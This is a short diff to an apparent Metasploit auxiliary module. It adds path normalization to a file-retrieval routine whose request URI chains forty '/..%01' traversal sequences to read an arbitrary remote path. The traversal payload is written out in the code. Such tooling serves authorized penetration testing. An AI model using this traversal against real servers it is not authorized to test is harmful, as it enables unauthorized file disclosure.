@@ -65,7 +65,8 @@ class Metasploit3 < Msf::Auxiliary
 	def run
 		print_status("Attempting to retrieve #{datastore['RPATH']}...")
 
-		uri = Rex::Text.uri_encode(datastore['DIR']) + "/..%01" * 40 + Rex::Text.uri_encode(datastore['RPATH'])
+		dir = normalize_uri(datastore['DIR'])
+		uri = Rex::Text.uri_encode(dir) + "/..%01" * 40 + Rex::Text.uri_encode(datastore['RPATH'])
 
 		res = send_request_raw({
 			'uri'            => uri,
